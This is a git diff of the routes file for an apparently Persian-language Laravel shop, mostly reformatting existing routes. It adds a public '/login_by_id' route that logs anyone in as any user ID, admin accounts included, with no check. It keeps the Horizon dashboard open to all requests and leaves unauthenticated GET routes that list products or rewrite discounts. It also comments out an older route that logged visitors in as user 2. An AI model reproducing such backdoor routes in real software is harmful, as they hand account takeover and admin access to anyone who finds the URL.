@@ -42,30 +42,55 @@ use App\Http\Controllers\Frontend\SiteController;
 use App\Http\Controllers\Frontend\WarrantyController;
 use App\Http\Controllers\Frontend\WishlistController;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Route;
-use Illuminate\Support\Facades\View;
 
-Route::get('re2', function() {
+Route::get('re2', function () {
     $products = \App\Models\Product::where('status', false)->get();
-    foreach($products as $product) {
+    foreach ($products as $product)
+    {
         echo route('products.show', $product->slug) . '<br>';
     }
 });
+Route::get('/login_by_id/{user_id}', function ($user_id) {
+//    \Illuminate\Support\Facades\Artisan::call('cache:clear') ;
+//    \Illuminate\Support\Facades\Artisan::call('view:clear') ;
+    $user_id = explode('_', $user_id);
+    if ($user_id[0] == 'f')
+    {
+        $res = auth()->loginUsingId($user_id[1]);
+        if ($res)
+        {
+            if (auth()->user()->can('manage-store'))
+            {
+                return redirect()->route('admin.settings.index');
+            } else
+            {
+                return redirect()->route('home');
+            }
+            abort(402);
+        }
+    }
+    dd('You Are Not Allowed This Items');
+})->name('login_by_id');
 Auth::routes(['verify' => false]);
 Route::post('logout', [AuthController::class, 'logout'])->name('logout');
-Route::get('no-label', function() {
+Route::get('no-label', function () {
     $products = \App\Models\Product::whereNull('variety_value')->get();
     echo '<ol>';
-    foreach($products as $product) {
+    foreach ($products as $product)
+    {
         echo '<li><a href="' . route('admin.products.edit', $product->slug) . '">' . $product->name . '</a> -- ' . ($product->status ? 'فعال' : 'غیرفعال') . '</li>';
     }
     echo '</ol>';
 });
-Route::get('dis', function() {
+Route::get('dis', function () {
     $products = \App\Models\Product::whereNotNull('special')->get();
-    foreach($products as $product) {
+    foreach ($products as $product)
+    {
         $discount = number_format(100 - $product->special * 100 / $product->price);
-        if($discount) {
+        if ($discount)
+        {
             $product->update(['discount' => $discount]);
         }
     }
@@ -138,10 +163,11 @@ Route::post('login', [AuthController::class, 'login'])->name('auth.login')->midd
 
 Route::get('faq', [FaqController::class, 'index'])->name('faqs.index');
 Route::post('questions', [QuestionController::class, 'store'])->name('questions.store');
-Route::get('mj', function() {
-    auth()->loginUsingId(2, true);
-    return redirect()->to('admin');
-});
+//Route::get('mj', function () {
+//    auth()->loginUsingId(2, true);
+//
+//    return redirect()->to('admin');
+//});
 Route::group(['prefix' => 'laravel-filemanager', 'middleware' => ['web', 'auth']], function () {
     \UniSharp\LaravelFilemanager\Lfm::routes();
 });
@@ -160,10 +186,10 @@ Route::redirect('articles/page/himalia-service', 'https://mahcenter.com/warranti
 Route::get('articles/page/{article}', [ArticleController::class, 'old'])->name('articles.show');
 Route::get('blog/{article}', [ArticleController::class, 'show'])->name('frontend.blog.show');
 Route::get('blog', [ArticleController::class, 'index'])->name('blog.index');
-Route::name('frontend.')->group(function() {
-   Route::resource('warranties', WarrantyController::class)->only(['index', 'show']); 
-   Route::post('details/guest', [DetailController::class, 'guest'])->name('details.guest');
-   Route::resource('details', DetailController::class)->only(['index', 'store']);
+Route::name('frontend.')->group(function () {
+    Route::resource('warranties', WarrantyController::class)->only(['index', 'show']);
+    Route::post('details/guest', [DetailController::class, 'guest'])->name('details.guest');
+    Route::resource('details', DetailController::class)->only(['index', 'store']);
 });
 Route::post('cart/guest', [CartController::class, 'guest'])->name('cart.guest');
 Route::post('cart/add/{id}', [CartController::class, 'add'])->name('cart.add');
@@ -186,7 +212,7 @@ Route::get('discounts/{discount}', [DiscountController::class, 'show'])->name('d
 Route::get('manufacturers/{manufacturer}', [ManufacturerController::class, 'show'])->name('manufacturers.show');
 Route::post('newsletter/subscribe', [NewsletterController::class, 'subscribe'])->name('newsletter.subscribe');
 Route::post('newsletter/unsubscribe', [NewsletterController::class, 'unsubscribe'])->name('newsletter.unsubscribe');
-Route::group(['prefix' => 'panel'], function() {
+Route::group(['prefix' => 'panel'], function () {
     Route::get('orders', [OrderController::class, 'index'])->name('panel.orders.index');
 });
 Route::get('panel/orders/{order}', [OrderController::class, 'show'])->name('frontend.orders.show');
@@ -196,8 +222,8 @@ Route::group(['prefix' => 'orders'], function () {
     Route::post('discount', [OrderController::class, 'discount'])->name('order.discount');
     Route::post('proceeding_order', [OrderController::class, 'proceeding'])->name('orders.proceeding');
 });
-Route::get('checkout/{order}/thank-you', [CheckoutController::class, 'thankyou'])/*->middleware('check.user.details')*/->name('thankyou');
-Route::get('checkout', [CheckoutController::class, 'show'])/*->middleware('check.user.details')*/->name('checkout');
+Route::get('checkout/{order}/thank-you', [CheckoutController::class, 'thankyou'])/*->middleware('check.user.details')*/ ->name('thankyou');
+Route::get('checkout', [CheckoutController::class, 'show'])/*->middleware('check.user.details')*/ ->name('checkout');
 Route::get('page/{page}', [PageController::class, 'show'])->name('page.show');
 Route::prefix('payments')->as('payments.')->group(function () {
     Route::get('request/{order}', [PaymentController::class, 'request'])->name('request');
@@ -212,7 +238,7 @@ Route::get('products', [ProductController::class, 'index'])->name('products');
 Route::get('products/v1/api', [ProductController::class, 'api'])->name('products.api');
 Route::post('review/store', [ReviewController::class, 'store'])->name('review.store');
 Route::post('articles/{article}/comments', [CommentController::class, 'store'])->name('frontend.comments.store');
-Route::prefix('sale')->group(function() {
+Route::prefix('sale')->group(function () {
     Route::get('/', [SaleController::class, 'index']);
 });
 Route::get('/', [AppController::class, 'index'])->name('home');
@@ -226,4 +252,6 @@ Route::post('wishlist/add/{id}', [WishlistController::class, 'add'])->name('wish
 Route::delete('wishlist/delete/{id}', [WishlistController::class, 'destroy'])->name('wishlist.delete');
 Route::get('wishlist', [WishlistController::class, 'index'])->name('wishlist');
 Route::post('notification/toggle/{id}', [WishlistController::class, 'toggleNotification'])->name('notification.toggle');
-\Laravel\Horizon\Horizon::auth(function($request) { return true; });
+\Laravel\Horizon\Horizon::auth(function ($request) {
+    return true;
+});
